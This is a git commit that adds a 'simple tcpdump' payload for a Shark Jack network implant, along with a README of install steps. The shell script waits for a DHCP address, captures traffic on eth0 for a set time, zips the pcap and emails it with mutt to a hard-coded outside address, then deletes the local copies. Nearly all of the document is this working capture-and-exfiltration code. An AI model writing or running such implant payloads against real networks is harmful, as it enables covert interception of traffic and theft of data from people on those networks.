247c314f869361700cc1a08051f884f2c6bd4ee6
jboz <jules.bozouklian@epitech.eu>
2022-01-20 00:26:37 +0100

    add tcpdump example + exfiltration via email

---
+++ payloads/library/recon/simple-tcpdump/README.md
@@ -0,0 +1,7 @@
+- Install following packages : ``` coreutils-timeout zip ```
+- Refer to this payload to install package https://github.com/julesbozouklian/shark_jack_payload/blob/main/payload/util/install_package.sh
+- Or SSH to the Shark jack and use following command : ``` opkg install coreutils-timeout zip ```
+
+
+- For the mail refer to this exemple :
+https://github.com/julesbozouklian/shark_jack_payload/tree/main/payload/exfiltrate/email
---
+++ payloads/library/recon/simple-tcpdump/payload.sh
@@ -0,0 +1,57 @@
+#!/bin/sh
+# Title:         Simple tcpdump
+# Description:   Exemple of tcpdump with exfiltrationvia email
+# Author:        Jules Bozouklian - bozou_client
+# Version:       1.0
+# Category:      Template
+#
+# LED SETUP (Magenta)... Setting logs and waiting for IP address from DHCP
+# LED FAIL (Red Blink)... Failed to update opkg or install package
+# LED FINISH (Green Fast Blink to Solid)... Package install or listsuccessful
+#
+
+LOG_DIR=/root/loot/recon/simple-tcpdump
+DATE=`date +"%Y-%m-%d"`
+TIMESTAMP=`date +"%Y-%m-%d %T"`
+INTERFACE="eth0"
+TIMEOUT="15"
+EMAIL_RECEIPT="jules.bozouklian@epitech.eu"
+MUTT_FILE=/root/.muttrc
+
+LED SETUP
+
+NETMODE DHCP_CLIENT
+
+# Make log file
+mkdir -p $LOG_DIR
+LOG_FILE=$DATE"_$(find $LOG_DIR -type f | wc -l).log"
+LOG="$LOG_DIR/$LOG_FILE"
+
+# Wait until Shark Jack has an IP address
+while [ -z "$IPADDR" ]; do sleep 1 && IPADDR=$(ifconfig eth0 | grep "inet addr"); done
+
+LED ATTACK
+
+# TCPDUMP traffic on port 80 and 443
+echo -e "TCPDUMP start at `date`" >> $LOG
+# change the value of $TIMEOUT variable to change the duration of the tcpdump cature
+timeout $TIMEOUT tcpdump -i $INTERFACE -w capture.pcap
+echo -e "TCPDUMP end  at `date`" >> $LOG
+
+# create archive
+echo -e "Create archive  at `date`" >> $LOG
+zip -r /root/archive.zip /root/capture.pcap
+
+# send pcap by mail
+function sendEmail() {
+  echo "tcpdump pcap" | mutt -F $MUTT_FILE -a /root/archive.zip -s "Log $TIMESTAMP" -- $EMAIL_RECEIPT
+  sleep 5s
+}
+
+sendEmail
+
+# remove file
+rm /root/capture.pcap
+rm /root/archive.zip
+
+LED FINISH
